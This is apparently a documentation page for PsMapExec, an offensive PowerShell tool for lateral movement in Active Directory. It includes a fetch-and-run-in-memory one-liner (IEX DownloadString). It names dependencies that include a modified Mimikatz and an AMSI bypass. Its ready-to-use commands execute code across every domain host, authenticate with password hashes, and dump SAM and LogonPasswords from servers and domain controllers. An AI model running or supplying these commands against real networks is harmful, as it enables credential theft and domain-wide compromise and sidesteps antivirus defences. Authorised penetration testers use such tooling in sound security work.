# âš¡ PsMapExec

**Get it on GitHub:** [https://github.com/The-Viper-One/PsMapExec](https://github.com/The-Viper-One/PsMapExec)

**Load directly into memory:**

```powershell
IEX(New-Object System.Net.WebClient).DownloadString("https://raw.githubusercontent.com/The-Viper-One/PsMapExec/main/PsMapExec.ps1")
```

## General Usage

The general usage of PsMapExec is to define the following:

**Command** - (Optional) execute commands against the target\
**Force** - Used to override the warning message preventing the script from executing when **Domain** Administrator or Enterprise Administrator credentials are provided\
**Hash** - Used for authentication. You can supply either a hash or a password.\
**LocalAuth** - Uses local account credential for authentication. Currently only for WMI and RDP\
**Method** - How to authenticate against the hosts\
**Module** - If any modules need to be run against the target\
**Option** - Provide further commands to select modules\
**Password** - Used for authentication\
**ShowOutput** - Shows command output when using modules.\
**SuccessOnly** - Shows only hosts for which we can successfully authenticate to\
**Targets** - Which targets we cant to run against\
**Threads** - Specify the number of concurrent jobs against hosts (Default 20)\
**Username** - Domain user for which we wish to authenticate against the targets

Most of these have additional documentation that delves into more detail about each (Available on the left-hand sidebar of this page).

Generally, you can mix and match various parameters across different methods and modules.

## Dependencies

PsMapExec has some dependencies that need to be pulled from outside the script itself in order to function.

Primarily these are:

* Kirby (PowerShell based Kerberos ticket dump)
* Invoke-Pandemonium (Slightly modified Mimikatz)
* Invoke-Mongoose (AMSI Bypass)

{% hint style="info" %}
There are plans to ensure long term that PsMapExec requires no external dependencies, however this requires the script to be massively reduced and AV bypasses to be considered.
{% endhint %}

Currently, they are pulled from a seperate GitHub repository: [https://github.com/The-Viper-One/PME-Scripts](https://github.com/The-Viper-One/PME-Scripts)

If you are working within an environment that has no external access or GitHub is blocked by a firewall you will need to clone the scripts in the respository onto the system from which PsMapExec is running from.\
\
PsMapExec does not currently host a HTTP server for these so you will need to use something like HFS: [https://www.rejetto.com/hfs/?f=dl](https://www.rejetto.com/hfs/?f=dl)

PsMapExec supports pointing to a locally or alternatively hosted server for the script dependencies.

```powershell
PsMapExec -Targets All -Username [User] -Password [Pass] -LocalFileServer [IP]
```

<figure><img src="../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

## Examples

Execute WMI commands over all systems in the domain using password authentication

```
PsMapExec -Username Admin -Password Pass -Targets All -Method WMI -Command "net user"
```

Execute WinRM commands over all systems in the domain using hash authentication

```
PsMapExec -Username Admin -Hash [Hash] -Targets All -Method WinRM -Command "net user"
```

Check RDP Access against workstations in the domain

```
PsMapExec -Username Admin -Password Pass -Targets Workstations -Method RDP
```

Dump SAM on all servers in the domain using PsExec

```
PsMapExec -Username Admin -Hash [Hash] -Targets Servers -Method PsExec -Module SAM
```

Check SMB Signing on all domain systems

```
PsMapExec -Targets All -GenRelayList
```

Dump LogonPasswords on all Domain Controllers over WinRM

```
PsMapExec -Username Admin -Password Pass -Targets DCs -Method WinRM -Module LogonPasswords
```
